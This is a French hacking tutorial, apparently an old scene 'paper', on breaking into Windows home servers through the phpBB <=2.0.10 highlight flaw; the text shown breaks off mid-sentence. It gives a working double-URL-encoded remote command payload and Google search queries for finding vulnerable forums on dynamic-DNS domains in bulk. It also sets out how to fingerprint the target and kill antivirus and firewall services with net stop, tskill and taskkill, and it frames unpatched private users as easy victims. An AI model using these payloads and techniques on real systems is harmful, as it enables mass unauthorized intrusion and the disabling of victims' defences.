@@ -1,0 +1,2365 @@
+	 _____      _                  _             
+	|_   _|    | |                (_)            
+	  | | _ __ | |_ _ __ _   _ ___ _  ___  _ __  
+	  | || '_ \| __| '__| | | / __| |/ _ \| '_ \ 
+	 _| || | | | |_| |  | |_| \__ \ | (_) | | | |
+	 \___/_| |_|\__|_|   \__,_|___/_|\___/|_| |_|
+                                             
+
+ 
+    -- [ Intrusion de serveur
+
+	De la pénétration de serveur Win32, et du maintien de son accès,
+	Ainsi que la pose manuelle d'un serveur SSH sur ce dit serveur,
+	By Icingtaupe for #n0name, greetz to all of them..
+
+
+
+Mentions légales : Toutes ces informations sont a titre  informatif  et
+uniquement  informatif. Je ne  suis en AUCUN CAS  responsable de ce que  vous
+ferez de ces informations, et sachez que  tout ceci est  punis par la loi  de
+très fortes amendes et de trèèèès  lourdes  peines de  prisons ( sans compter
+les inconvénients de la  prison,  j'entends  par la  inconvénients  physique.
+Comprenne qui pourra. ) Donc, comme vous le comprenez, j'y suis pour rien  si
+vous vous faites arrêter parce que vous avez décidé de faire  comme moi  j'ai
+décris ces actions dans  ce texte ... on  est  bien  d'accord la dessus :) Si
+non, vous pouvez fermer ce document et passer au suivant...
+
+
+
+
+(~~ Partie I : Exposition et contraintes majeures ~~)
+
+
+	 Taratatsointsoin, voici l'heure d'un petit paper ! ( et ca rime ! ).
+Oui, je me  doute,  vous  avez  remarqué que  c'est un  paper, huhu,  mais je
+préfère le préciser. Comme je présume que vous avez  lu le titre  ( sinon, je
+vous enjoints à le  faire de suite,  ce sera  surement plus pratique ),  vous
+savez donc surement de quoi nous allons parler  aujourd'hui, c'est a dire  de
+comment se créer un accès sur un serveur, et comment  le maintenir  ( le plus
+important ).J'entends  d'içi  les  linuxiens  acharnés  soupirer de   malheur
+( Bouark, un serveur Win32.. ca existe encore ? Quelle idée stupide ! ), mais
+moi, Windows, j'aime ça,  le soir, un  ptit coup de Windows, une clope  et au
+lit ... d'ailleurs, ne dit-on pas "Windows avant d'aller au  lit  fait passer
+bonne  nuit" ?  Probablement  a  cause  de  certaines de ses  "aptitudes" aux
+erreurs et bugs, qui nous vaut des sacrés maux  de têtes. Hé oui, mais  ca en
+reste le système le plus répandu malgré les avancées de Nunux, donc, autant y
+consacrer ce ptit paper. Mais retournons a nos moutons  ( ou serveurs ? ), de
+la concentration, que diable !
+
+
+   Tout d'abord, cherchons a définir ce que nous voulons : Nous désirons donc
+   un serveur avec :
+		- Un maximum d'espace disque,
+		- Une bande passante puissante,
+		- Un temps de connexion maximal, au mieux, 24/24,
+		- Des droits roots si besoin est,
+		- Des possibilités pour retrouver ce dit serveur facilement
+                     et rapidement, via des redirections ou des DNS,
+		- Une exploitation facile et rapide ( inutile de passer 4h
+                     sur chaque serveur, on en finirait pas )
+		- C'est tout, ne soyons pas trop gourmands pour un début :)
+
+
+	Comme vous le voyez, tout ceci ne se trouve pas a chaque coin de rue,
+nous avons des contraintes assez  importantes.  Je vois de la Mr Noob  qui me
+demandera "Mais, comment  qu'on fait pour  trouver  ce genre de  serveur ? Ca
+doit pas être simple ...",  hé bien,  extraordinairement, si. Nous  avons des
+outils de plus en plus developpés sur Internet, qui nous fournissent  de plus
+en plus de capacité, de pouvoir, nous offre la possibilité de savoir  tout ce 
+que nous désirons, de la taille d'une  libellule  sud-africaine au  record de
+saut  en longueur  d'Ouganda,  en passant  par comment  détourner un  IDS  et
+comment faire péter la boite au lettre de son voisin seulement  avec du  lait
+et du chlore... vous le voyez, nous pouvons absolument tout savoir, sur  tout
+ce qui a été écrit, dit, n'importe ou que ce ce soit passé dans  le monde, au
+Japon comme au Brésil, a  condition  de maitriser  l'outil principal dans  la
+recherche de cible d'un hacker, j'ai nommé : Google. Hé oui, ca fait 4 lignes
+que certains l'attendaient avec  impatience, Google, cet  outil en  apparence
+simpliste et qui vous sert a trouver la cote argus de votre voiture peut nous
+permettre de penetrer un serveur en moins de 15 minutes, et d'y installer  ce
+que nous  désirons  dans ce  même  laps de temps. Je  ferais réference içi  a
+plusieurs de mes anciens tutoriels, mais rappelerais les bases pour que  ceux
+qui ne les ont pas lu  puissent suivre  quand même ( faut bien ). Ainsi donc,
+repensons a nos contraintes, et réflechissons un millipoil - pas plus,  après
+ca fatigue - Comment trouver ce genre de serveur ? Nous nous  limiterons  içi
+aux  particuliers ... Hé bien, il  faut  réflechir sur  le 5e  point  de  nos
+contraintes : le DNS. Nous savons qu'il existe diverses opportunitées pour un
+particulier d'avoir un nom de  domaine assez  facilement,  ou, sans DNS,  une
+redirection d'un nom plus facile a retenir qu'une IP, joignant une  sorte  de
+DNS spécial a votre IP dynamique. ( On a donc a ce moment la un DNS statique,
+pour une IP dynamique ) Ce genre de  service  permet  donc de retrouver  plus
+facilement  votre site web, avec un nom spécialement créé pour, et vous évite
+de changer d'URL a chaque changement d'IP ( nous remarquerons qu'une série de
+4 groupes  de  chiffres,  c'est  pas l'idéal  pour une URL ). La solution  se
+trouve dans ces services, comme par exemple No-IP ou DynDNS.
+
+	Hé oui, ces services en apparences innocents et forts pratiques  sont
+en réalités pratiques et pour l'utilisateur et pour le hacker : Pour cela, il
+faut nous renseigner un peu sur ces redirections. On souscrit donc un  compte
+( gratuit, faut pas abuser ), afin de se voir offrir toutes les  possibilités
+de ces services, même si certains sont payants ils sont quand même  affichés.
+Nous avons  donc  des  no-ip.com,  des  dyndns.org,  des  kicks-ass.net,  des
+dnsalias.com, no-ip.org,  security.org,  de  tout,  de  tout ...  mais  c'est
+magnifique, c'est un grand  avantage  pour nous :) Allons  donc dans  Google,
+munis de notre  petite  liste  d'alias  DNS  possible : Nous  remarquons  que
+plusieurs   possedent  le  même  radical  ( par  exemple,  kicks-ass.net   et
+kicks-ass.com ), ce qui nous aidera aussi  :  on  peut  ainsi  "scanner"  sur
+plusieurs domaines en même  temps  en  une  seule  requête Google ! Voyons de
+suite comment : Grace a la balise "inurl". A  cause  d'un  worm  nommé Santy,
+certaines balises sont dorénavants un peu  trop  surveillées, comme allinurl,
+ce genre de choses ... nous nous contenterons  d'un "inurl", non  bloqué,  et
+en utilisant une ou deux astuces pour "contourner" ce système  de protections
+Google et pour trouver ce que nous désirons.
+
+	Mais au fait, comment allons nous construire tout ça ? Comment allons
+nous pénetrer le serveur ? Hey, attendez un peu, on en est qu'a l'exposition,
+jvous rappelle ! :o Pas la peine de se presser :) Mais je vais répondre quand
+même, après avoir terminé avec Google ( ce qui vous apportera  un  élément de
+réponse a votre question ). Voila, donc, nous avons une requête Google déja a
+moitié  construite,  contenant   "inurl:*undomaine*",  mettont   par  exemple
+"inurl:no-ip", ce qui aura pour effet de rechercher dans les no-ip.com,  org,
+biz, net, etc... Donc, un  large choix d'action ;)  Maintenant, passons a  la
+deuxième partie de la  requête, qui  contiendra  l'élement  décisif de  notre
+"blind"  attaque  ( ainsi nommée parce que le but  n'est  pas  d'attaquer  un
+serveur en particulier, mais de se  faire le  maximum  de  bounce possible ),
+c'est elle qui déterminera quel faille & exploit nous allons   utiliser. Dans
+le cas présent, puisqu'elle est pratique, rapide, puissante, et répandue chez
+les particuliers, nous utiliserons la faille Highlight des forums PhpBB  dont
+la   version   est  inférieure  ou  égale  a  2.0.10.  Evitons  de  faire  le
+script-kiddies, tachons de comprendre cette faille avant de continuer.
+
+	La faille phpBB2 <=2.0.10 Highlight est une faille qui concerne le
+champ  highlight  des  forums  phpBB,  qui  est  contenu  dans   le   fichier 
+viewtopic.php. Cette variable  est  appelée  lors  d'une  recherche,  si  par
+exemple vous avez fait une recherche sur le forum concernant le mot "loutre",
+et qu'un topic contient ce mot, alors a la fin de l'URL du topic est  ajoutée
+la séquence "&highlight=loutre", afin que le mot "loutre" ressorte du  topic,
+il est mis en  "surbrillance",  de  l'anglais  "Highlight"  ( dur  a  écrire,
+d'ailleurs ).La faille consiste dans le fait que ce champ est mal vérifié, on
+peut y inclure la commande  de  son  choix a  travers  une  URL  spécialement
+formatée : En utilisant la forme  "URL-encodée"  de  certains  caractères, on
+peut obtenir quelque chose de très intéressant, comme le  pouvoir  d'executer
+une commande système sur un serveur, juste avec une URL : comme  la  variable
+est tout de même formatée, il faut jouer d'astuce : on utilisera la  fonction
+"chr", ainsi que le code ASCII des commandes que nous voulons éxecuter sur le
+serveur. Par exemple, pour executer la commande dir,  on ajoute ceci  a l'url
+d'un sujet d'un forum vulnérable : 
+
+highlight=%2527%252esystem(chr(100)%252echr(105)%252echr(114))%252e%2527
+
+On voit donc bien ici les caractères en "URL-encode", qui sont %2527, en fait,
+tous les caractères précédés d'un %. Mais içi, les découvreurs de cette faille
+ont été encore plus malins que le simple "URL-Encode" basique : Les caractères
+sont doublement encodés ! Une simple recherche Google vous montrera   quelques
+pages pour faire du URL-décode, et vous pourrez y entrer les valeurs    ... et
+admirez : La valeur décodée de %2527 est ... %27 ! Encore une valeur encodée !
+Et si on la redécode a nouveau, on obtiendra alors le véritable caractère, qui
+est " ' ". Comment le serveur arrive a comprendre cette valeur ?  C'est  parce
+qu'il execute lui même l'url-décode, et donc, il obtient bien la valeur '.  En
+testant plusieurs valeurs ainsi encodées, on se rend compte  qu'il  suffit  de
+supprimer  le  "52"  a  l'intérieur des valeurs encodées pour avoir  la valeur
+simplement encodée. Et  de  décodage  en  décodage,  on  obtient  alors  cette
+commande :    '.system(chr(100).chr(105).chr(114)).' .   On  progresse dans la
+transcription. Comme dit plus haut, cet exploit utilise  la  valeur ASCII  des
+lettres de la commande systeme : La  fonction "chr" se charge de récuperer  la
+lettre correspondante a un numéro de la table ASCII : Ainsi, si vous verifiez,
+vous verrez que la  lettre "d" correspond  bien a  la valeur  100 de l'ASCII (
+pour ceci, laissez la touche Alt enfoncée, puis, tapez le numéro du  caractère
+ASCII sur votre clavier numérique. Vous obtiendrez le caractère  correspondant
+a la valeur que vous avez entré ). De fil en aiguille, on  obtient donc  a  la
+fin : '.system(dir).' Génial, puisque la syntaxe de la commande System de  PHP
+est bien celle ci, "system(command)". La commande désirée est donc utilisée et
+executée sur le  serveur distant, avec les  droits  du  programme  l'executant
+( souvent, les droits root ).
+
+	Bien, maintenant que vous  avez  compris  comment  fonctionnait  cette
+faille,  libre  a  nous  de  l'utiliser  comme bon  nous  semble,  avec  notre
+conscience tranquille. Comme nous  utiliserons  cette faille, il  nous  faudra
+donc trouver des phpBB  vulnérable, et  c'est la  qu'intervient  l'interêt  de
+rechercher des serveurs de particuliers : beaucoup de gens  prennent la  peine
+de creer un serveur web  sur  leur ordinateur,  sans même savoir ce  qu'est un
+hacker, ou ... une mise  a jour. Ainsi, les particuliers  étant les  personnes
+les moins bien informées, c'est elle qui  prendront  donc  un forum  facile  a
+creer, rapide, également facile a administrer, et  qui  fonctionne  sans  trop
+qu'on  sache  pourquoi : le  phpBB2 a été le plus  choisi  dans  ce  genre  de
+concours. Oui, mais .. des phpBB, il y a eu énormement de releases de ce forum
+! Et comme notre exploit est  valable pour  les version <= 2.0.10 ( comprendre
+inférieure ou égale a 2.0.10 ), la 2.0.11  étant  la dernière  releaseen date,
+notre exploit est valable sur  presque  tousles  forums phpBB  existant,  nous
+aurons donc beaucoup de victimes potentielles, car voici une  deuxième  raison
+pour laquelle les particuliers  seront nos privilegiés : puisqu'ils  n'ont que
+peu connaissance des  mises  a  jours  de  sécurité,  des  vers,  des  failles
+possibles  et  inimaginables,  il  y  a  fort  a  parier   que   beaucoup,  ne
+connaissant  pas vraiment le monde de l'informatique, ne prennent pas le temps
+ni la peine de mettre a jour leur version de phpBB, ce qui explique  que  l'on
+trouve des 1.3, des 2.0.1, des numéros de version très bas .. et sur  lesquels
+notre exploit fonctionne ! Voici donc remplies les contraintes 5 et 6, puisque
+nos cibles seront aisément retrouvables grace a leur adresse no-ip ( installés
+par leurs soins, c'est gentil ), et facilement  exploitable, puisque très très
+répandu et facile  d'exploitation. La  faille  idéale,  puisqu'en  plus,  nous
+pouvons y executer des commandes systèmes ... avec les droits root :)
+
+
+
+
+(~~ Partie II : De la recherche d'une cible ~~)
+
+
+	Bien, nous savons  donc  maintenant  sur  quels  domaines  chercher nos
+victimes, quelle faille utiliser, nous savons aussi que nous pourrons retrouver
+facilement nos victimes, il nous reste a terminer  la  requête  Google  afin de
+pouvoir trouver de quoi exploiter. Nous avons  donc  déja ce début de requête :
+inurl:no-ip
+Vous avouerez que c'est peu, mine de rien. Bon, alors  continuons  a  réfléchir
+afin de trouver le maximum de victime potentielle  :  Nous  devons  trouver  LE
+point commun, cette petite phrase que l'on  retrouve  dans  chaque phpBB,  dans
+chaque forum, n'importe lequel, absolument tous ont  cette  phrase  d'incrustée
+dans leur interface, signe  de  la  proprieté  du  forum,  je  veux  parler  de
+: "Powered by phpBB". Ces  trois  mots  vont  nous  permettre  de  trouver  des
+milliers  de  victimes !  Seulement  voila,  souci :  Depuis  le  vers   Santy,
+exploitant  cette  même  faille  phpBB  Highlight  et  utilisant  le moteur  de
+recherche de Google, il  est  apparu  que  pour  l'arrêter,  Google  avait  mis
+quelques protections contre ce genre de requêtes. Bon, hé bien soit,  modifions
+un peu : Plutôt que de mettre "inurl:no-ip, "Powered by phpBB"", mettons plutôt
+( non, pas plutôt le chien de mickey... ^^" ) :
+ 
+inurl:no-ip, powered, phpBB
+
+Inutile de mettre  le  "by", Google  le  prenant  pour un  mot  courant  et  le
+supprimant  automatiquement. Lancez la  recherche ...  pouf,  des  milliers  de
+victimes, des  dizaines  de  pages de résultats .. qui  n'attendent  que  vous.
+
+	Oui, mais voila, nous, on veut faireun boulot de qualité, didiou !  Pas
+un truc miteux, qui ne fonctionnerait plus au moindre petit sursaut ! Du solide
+du bon vieux chêne ! ( Ou platane, c'est selon ) Et on a donc des contraintes..
+hééééé oui, les petites contraintes que tout le monde il a zappé  entrainé  par
+le flot de mes mots ( et ca rime derechef ! ). Faisons le point. A l'endroit ou
+nous sommes, nous n'avons plus que 3 contraintes :  l'espace disque,  la  bande
+passante, et la disponibilité. Hey, soyons sérieux, un SSH offline es t un  SSH
+mort et inutile. Sans compter que s'il est online 24/24, mais qu'il  est  lancé
+sur un serveur possédant une vitesse faible, du genre du 56K, c'est un  SSH qui
+recoit les commandes trop tard et dont le lag est  aussi  long  qu'un  dimanche
+chez grand-mère ( expression inventée sur le tas, ne m'en voulez  pas,  merci |
+et mes excuses a toutes les grand-mères qui liront ce  paper ), et  donc,  tout 
+aussi inutile qu'un SSH offline ( d'ailleurs, on peut  considerer  que  vu  son 
+temps de réponse, c'est un SSH offline. ). Quant a  l'espace  disque .. il  est
+facultatif, mais c'est toujours mieux d'avoir un peu de place  disponible  pour
+vos futurs tools :)
+
+	Bon, alors réflechissons : Si ces sites sont recensés sur Google, c'est
+qu'ils sont logiquement souvent online. Voila donc un problème de réglé  ( nous
+sommes d'accord pour dire qu'il faudrait un bol extraordinaire pour que  le bot
+Google tombe sur ce nom de domaine pendant les 10 minutes  où  le  serveur  est
+actif ... de l'année. ), et  nous  éliminons  du  coup un autre problème un peu
+plus sournois : Et si ce  serveur venait a "mourir" ? Et s'il devenait offline,
+d'un coup, et pendant des  mois ?  Huhu, stupide idée : Un serveur recensé dans
+Google doit être online depuis un certain temps, et si en plus, il est toujours
+online lorsque vous vous rendez sur la  page,  c'est  qu'il  y  a  des  grandes
+chances qu'il soit online  tout  le  temps. Voila  donc  une  idée superflue de
+supprimée. Donc, la présence de ce site dans Google  et  sa  validité  actuelle
+nous "garantit" déja un temps online assez important, ce qui nous retirerait la
+3e contrainte :) Restent alors les contraintes 1  et  2, qui  nous  disent donc
+d'avoir un max d'espace libre, et une  bonne  bande  passante. Tout  ceci  sera
+verifié dans la partie III, pour l'instant restez patients :)
+
+	Bien, maintenant, nous  avons  notre  requête  Google, nous  avons  des
+milliers de PC vulnérables a nos  attaques.  Mais,  encore  faut il  réussir  a
+cibler l'OS distant, pour éviter de tenter des  dizaines de  commandes  qui  ne
+serviraient a rien. Il faut savoir une chose sur l'exploit phpBB Highlight : Si
+vous executez une commande système, n'imaginez pas que tout soit affiché; et en
+voici la raison : 
+
+	Sous Windows ( et surement sous Linux, je n'ai hélas  pas verifié ),
+un programme dit "console" est constitué de trois périphériques d'entré/sortie,
+non pas matériels mais logiciels, qui  portent  des  noms  standards. Ils  sont
+nommés   stdout,  stdin, et  stderror. Les  noms  sont  assez  explicites,  ils
+représentent  les  entrées  et  sorties  par  défaut,  appliquées  a  tous  les
+programmes. Le  préfixe  Std  veut dire Standard,  et  le  suffixe  désigne  la
+direction : 
+
+Out = périphérique de sortie, in = per. d'entrée, error = per.
+
+Pour les messages d'erreurs. Hé oui, même si vous ne vous en rendez pas compte,
+l'affichage d'un écran sous console est  constitué  de deux  périphériques,  le
+"out" et le "error", le out est sollicité lorsque le programme a  bien  réalisé
+sa tache, le "error" est sollicité dans tous les autres cas, pour afficher  les
+messages d'erreurs. On appelle ces  périphériques  des "pipes"  ( dont  on peut
+jouer en Assembleur, par exemple ).
+
+	Ainsi donc, après quelques manipulations, il est apparu quelque chose :
+Seul le stdin est pris en compte lors des manipulations, ce qui veut   dire que
+vous ne verrez pas les messages d'erreur de tous les programmes, seuls certains
+qui utilisent le stdout pour afficher un message  précis.  Mais si  vous  tapez
+n'importe quoi, vous n'aurez pas droit a l'habituel  message "Machin  n'est pas
+une commande interne...blabla...", vous ne verrez  rien  du tout. Et  pourtant,
+votre commande aura été executée, mais aura échoué.C'est donc maintenant que le
+mot "blind" prend tout son sens, puisque non seulement nous allons utiliser des
+serveurs que nous ne connaissons pas et pris au hasard, mais de plus,  nous  ne
+verrons pas tous les résultats. Il faut donc  connaitre  les  réactions de  tel
+programme lorsqu'il est activé  avec  telle  commande, et  utiliser  l'argument
+"verbose" au maximum, afin d'obtenir le  maximum  d'information  possible, tout
+ceci implique une grande connaissance du systeme distant.
+
+	Et justement, comment le définir ? La encore,  c'est  une  histoire  de
+point commun. Les programmeurs de Linux, ne  voulant  pas  trop  "dépayser" les
+gens passant d'un systeme a un autre, ont  integré des  commandes  Windows dans
+leur noyau, afin qu'elles restent valides et qu'elles fonctionnent. C'est ainsi
+qu'il en est pour la commande "dir", qui est valable aussi bien sous Windows et
+sous Linux, dont l'équivalent est  "ls"  sous  celui  ci. Mais ... comme  "dir"
+marche et nous permet d'avoir un listing de dossier,  nous allons donc  pouvoir
+determiner le systeme distant ! A ceux dont l'étincelle qui a jailli en  lisant
+cette ligne se sont dit  "Mais oui,  un dir C:\, et pouf,  on sait tout  !", hé
+bien, oui, mais non, encore plus rapide. Encore une fois, tout est connaissance
+du systeme, et de ses réactions. Tentez un "dir" sur une  machine  linux,  vous
+aurez droit a un listing sobre des fichiers dans le répertoire  courant  ( sans
+avoir toutefois le chemin de celui ci ). Ce listing sera donc de la forme :
+
+admin.php
+config.php
+...
+
+	Bref, pas de fioritures, que diable ! On est sous linux, un OS  de pro,
+alors faut faire soft ! Hé bien sous  Windows,  c'est  totalement  l'inverse ^^
+Vous aurez droit a des jolies "Le volume a tel nom, il a tel  numéro de  série,
+vous êtes dans tel répertoire, il y a tant  de  fichiers,  tant repertoires, il
+reste tant d'espace libre sur le disque et  les fichiers présents prennent tant
+de place." Bien sur, entre les deux, vous aurez  le listing des fichiers. Comme
+vous le voyez, ces différences  font  qu'il  est  très  simple de determiner le
+système distant, a  l'aide  d'une  simple  commande, un  simple "dir", et  vous
+pouvez savoir quel est l'OS distant. Afin de faire une précision  optimale,  si
+vous avez obtenu une réponse de type "Windows", en executant un :
+"Dir %homedrive%\"
+vous obtiendrez non seulement la lettre de lecteur systeme, et vous  pourrez  y
+voir le dossier Windows, spécifique  a  certaines  versions : Un dossier  nommé
+"WinNT" sera un ... WinNT, alors qu'un dossier Windows sera  plus  probablement
+un XP.
+
+
+
+
+(~~ Partie III : Mettre la cible à nue ( on a bien dit la cible ) ~~)
+
+
+       Bien ! Nous avons donc maintenant déterminé l'OS distant, et nous serons
+donc a même de mieux pouvoir entrer dedans, par la petite porte, bien  entendu.
+Toujours avec cet exploit ( dont vous pourrez trouver un lien plus bas, section
+"Resource" ), tentez d'executer la commande système "tasklist". En fait,  cette
+ commande est un programme situé sur WindowsXP, et qui permet  de  "charger" la
+liste des processus lancés et actifs, absolument tous, incluant  svchost.exe
+, lsass.exe, bref, tous les processus systèmes dit "en arrière-plan"
+, car on ne voit d'eux aucune trace lorsque l'on utilise la station de travail.
+Ainsi, en executant ce programme, vous pourrez définir quels sont  les  systeme
+de protections installés sur  le  poste  distant,  en observant  la  liste  des
+processus. Afin d'avoir toutes  les  informations  mieux  "ordonnées", je  vous
+conseille de lire la source, où les informations sont  rangées  comme  si  vous
+aviez éxecutés cette commande dans un terminal Dos ( ou "Invite de Commande" ),
+avec un retour chariot après chaque processus. Donc, nous avons  les  processus
+distant. Soit. Mais admettons que pour une raison obscure ( mauvaise version de
+Windows ? Administrateur soucieux  qui  a  donc  supprimé  tasklist ? ),  cette
+commande ne renvoie rien ? Pas de panique,  comme  d'habitude  chez  Microsoft,
+vous pensiez avoir une seule occasion, raté,  vous en avez d'autres de cachées.
+Executez donc qprocess.exe, et regardez le  résultat :  Hé oui,  vous  avez  de
+nouveau une liste de  processus,  mais,  attention,  celle çi n'est pas du tout
+complète. Ainsi, seuls  les  processus  dits  "visibles"  seront affichés : Par
+exemple, le processus du firewall Agnitum Outpost Firewall Pro  ne  sera
+pas affiché, car il est lancé par défaut en mode "background", c'est a dire  en
+"arrière plan", en "tâche de fond". Donc, cette commande peut être utile,  afin
+d'avoir une vision globale du système, mais ne permet pas de  définir  vraiment
+tous les services de sécurité installés  a  distance.  Néanmoins,  si  lors  de
+l 'execution de "qprocess" vous remarquez  des  processus  en cours d'éxecution
+tels que ccApp.exe, ne vous  faites  pas  d'illusion,  Norton  AntiVirus
+n'est pas loin.
+
+	Seulement  voila  : Les  éditeurs  d'Antivirus,  petits  malins,  ne se
+laissent pas faire comme  ça   :  ils  ont  donc  developpés  des  applications
+s'executant en tant que Service, et il n'est pas  possible  de les  arrêter  en
+"tuant" le processus, en le stoppant brutalement, ils ne sont désactivables que
+en désactivant le service, faute de quoi l'executable sera relancé  tout  seul,
+assez embêtant lorsque  vous  voulez  arrêter  un  antivirus,  ou  un  firewall
+( pare-feu ). Il nous faut donc trouver une solution facile, rapide, et surtout
+: accessible en Dos, et disponible sur tous les Windows. Encore une fois,  tout
+est affaire de point commun, et de  quelques  recherches  et  tests. Nous  nous
+rendons compte, après plusieurs  essais,  qu'un  executable  est  très  souvent
+( toujours ? ) présent sur un Windows, et précisement dans le dossier System32:
+J'ai nommé net.exe. Et comme chez 'Crosoft, ils sont prévoyants, ils  nous  ont
+même fait un net1.exe, executable qui ressemble en tout points a net.exe,  mais
+un peu différent dans  son  architecture  ( d'ailleurs,  c'est  remarquable  au
+niveau du poids de l'executable ). En effet, lorsque l'on désassemble  net.exe,
+et net1.exe, on  peut  s'apercevoir  que par  exemple, la  fonction  SHARE  est
+différente : Sur net.exe, elle permet de voir  les  fichiers  partagés  sur  le
+réseau ( grace a l'API "NETAPI32.NetShareEnum" ), alors que net1.exe permet  de
+créer des partages de fichier a partir de n'importe quel  ordinateur  ( grace a
+l'API "NETAPI32.NetShareAdd" ). Mais dans les deux programmes,  on retrouve une
+commande très très intéressante : le Stop. Cette fonction permet, a partir d'un
+nom de service, d'arrêter tel ou tel service, selon votre bon vouloir.
+Accessible en ligne de commande, et disponible sur tous les  Windows ! Avec  en
+plus, une  copie a peu près conforme, nommée Net1.exe. Que  demander de  plus ?
+Les noms de services ? Ha oui, tiens. Effectivement, ca peut  être utile,  pour
+stopper un service :)
+
+	Résumons : Nous avons la liste des processus, en tâche de fond  ou  non
+( selon que vous avez utilisé qprocess ou Tasklist. ).  S'ensuit  maintenant un
+travail de recherche, toujours avec votre ami le plus  cher,  Google.  A partir
+des noms d'executables, vous pourrez retrouver très  aisément le nom de service
+lui correspondant, et ce sous plusieurs formes :  Certaines personnes ont mis a
+disposition sur Internet des logs d'un programme  nommé  HijackThis, qui permet
+de savoir énormement de choses sur son ordinateur, les BHO (BrowserHelpObject),
+les services, les processus, les clées de registre  ( lancement,  etc )...   hé
+oui, les services. Et pour les services, c e programme les  présente  sous  une
+forme des plus pratique pour nous, de la forme :
+"Nom du service sous Windows - Son Editeur - Le chemin de l'executable".
+Ce qui vous permet, à vous, petit pirate en herbe ( ou en mousse ? en  carton ?
+en purée ? ), de trouver absolument tout ce dont vous avez  besoin ! Il  suffit
+de taper une requête  dans  Google, "nomdel'exe.exe,  service", et  pouf,  vous
+obtenez des dizaines de pages traitant de votre  executable,  et  des  services
+associés. Mieux encore : Bien souvent, un  antivirus  ( ou firewall )  installe
+plusieurs executables et services. Oui, mais alors, un seul log hijackthis peut
+vous permettre de retrouver tous les services d'un seul et unique  antivirus  ! 
+Pratique, très pratique, et  vous  pouvez  donc  savoir  quel  executable  vous
+arrêtez, associé avec quel service, et ceux qu'il  vous  reste  a  arrêter.  De
+cette manière, en  procédant  par  élimination,  vous  arrêtez  une à  une  les
+défenses de la cible, la rendant ainsi sans défense, et prête à être  prise  en
+main par vos petits doigts experts.
+
+	A ceux qui se demandent : "Mais comment je les stoppe, les services?
+Je répondrais que soit vous avez mal lu, soit mal compris. En fait,  il suffit,
+grace aux noms de services   trouvés  précedemment,  de  taper  dans  l'exploit
+NET STOP "Nom Du Service", et d'admirer le résultat. Ca peut être long parfois,
+notamment le travail de recherche pour les correspondances executable / service
+,mais le résultat est la. Vous pouvez donc ainsi avoir plus  de 10  services  à
+arrêter, surtout avec des antivirus du genre de Norton qui s'installent partout
+, avant de pouvoir rééllement entrer dans  l'ordinateur. Tout  est  affaire  de
+recherche, et uniquement de recherche. A noter que vous pourrez parfois  tomber
+sur des petites surprises plutôt amusantes d'apparence, mais dangeureuses :  Un
+executable ainsi nommé "TeaTimer.exe", d'apparence anodine, est en  réalité  le
+scanner de Spybot: Search and Destroy. Ceci est fait exprès, c'est  la  volonté
+du programme, afin de mieux passer inapercu. N'oubliez  donc  pas  de  verifier
+n'importe quel processus dont vous ignorez la provenance, il vaut mieux  passer
+un peu plus de temps a bien être sur d'avoir arrêté  les  défenses que  d'aller
+trop vite et se faire reperer...
+	
+	Il y a certains antivirus, qui n'installent pas de  services. Oui, mais
+alors comment les désactiver ? Hé bien, encore une fois, prévoyant le cas ou un
+pirate essaierait de s'introduire sur un ordinateur, Microsoft nous  a  délivré
+un joli petit executable, j'ai nommé tskill. Le nom parait déja assez évocateur
+, il rappelle  quelque  peu  "Kill Task",  nom  un  peu  barbare  mais  qui lui
+convient tout a fait. Sa syntaxe est assez simple, elle consiste a taper : 
+"tskill *nomdel'image*"
+mais attention, dans ce genre de cas, il ne faut pas donner d'extention : Ainsi
+ pour arrêter ccApp.exe, il faut taper "tskill ccApp" et c'est tout : De  cette
+manière, le programme devrait s'arrêter, pour peu que ce ne soit pas un service
+( qui se relancerait, dans ce cas la ). Ce programme  est  pratique  car  il ne
+kill pas tache par tache, de sorte que  vous  avez a  executer  plusieurs  fois
+tskill pour plusieurs même processus, mais tout est killé de la même  manière :
+si  plusieurs  instances  de   Notepad  sont   lancées,  et  que   vous  entrez
+"tskill notepad", alors tous les processus de Notepad seront arrêtés sans autre
+forme de procès. Parfois pratique, huhu :) A noter  que  si  le  programme  est
+executé, mais que la session n'a pas les droits administrateurs, tskill peut ne
+pas marcher et vous renvoyer un cinglant  "Accès refusé", ce  qui  vous  embête
+fortement. Hééé oui ... et si vous vous dites "mais ca fait 3 fois  qu'il  nous
+fait le coup, il va nous ressortir un programme de derrière les fagots, et nous
+arrêter tout ça en un rien de temps !", huhu, twingo,  c'est  effectivement  le
+cas. Hey, reflechissons  :  il y a  un tasklist ? Tentons  le taskkill ! Et  ca
+marche, magnifique que c'est :] La syntaxe est un peu différente de tskill,plus
+compliquée, mais on apercoit quelques options interessantes .. ainsi,  l'option 
+/F, qui permet de forcer  la  fin  d'un  processus,  et,  différence,  on  doit
+cependant spécifier l'extention, ou bien utiliser un  caractère générique  (*),
+ce qui aura pour effet d'arrêter tous les processus commencant par la  séquence
+que vous avez définie.Ô miracle, lui aussi termine les programmes "à la chaine"
+: Tous les programmes ayant le même nom de processus sont  tous arrêtés ! Comme
+ça, pas de jaloux ! Une autre option est celle de "killer" un processus via son
+PID, ce qui permet de mieux "cibler" le processus a terminer, et  n'en  termine
+qu'un seul, donc.Ce ptit programme peut être  utile,  il  est  l'équivalent  du
+tasklist par sa syntaxe complète, et  possède  plus  d'options. Il  est  donc a
+utiliser en priorité, mais n'est pas présent sur tous les systèmes  Windows ...
+donc, attention. 
+
+	Le PID, abréviation du Process ID, est un numéro unique, attribué  a
+chaque processus lors de son démarrage. Vous ne trouverez JAMAIS deux processus
+ayant le même PID, car sinon le système deviendrait  un  peu "fou".  Ce  numéro
+peut être utilisé de diverses manières, pour reperer un  processus, mais il est
+surtout utilisé et pratique pour  identifier  les instances  :  grace a lui, il
+est impossible de faire une erreur  entre  tel  ou tel processus, puisqu'il est
+unique : Ainsi, si vous savez  qu'un  processus  nommé Notepad a été lancé, que
+vous connaissez son PID, et que  vous  même lancez un executable nommé notepad,
+mais qui en réalité ne  l'est  pas  ( compliqué,  j'explique : un  trojan,  par
+exemple, dont le nom serait notepad, afficherait dans la  liste  des  processus
+actifs un "notepad.exe". ). Oui, mais voila, vous  voulez  arrêter  le  notepad
+lancé par l'utilisateur. Hé bien, c'est grace a lui que vous  pourrez  "cibler"
+celui lancé par l'utilisateur, et donc, éviter de "tuer" votre  propre  trojan,
+lancé un peu plus tôt. C'est  une  option  pratique, quoiqu'un peu fastidieuse,
+et dans 90% des cas on  préferera être barbare et tout killer  d'un coup.  Plus
+rapide. A noter que le PID est un chiffre aléatoire, souvent compris entre 1000
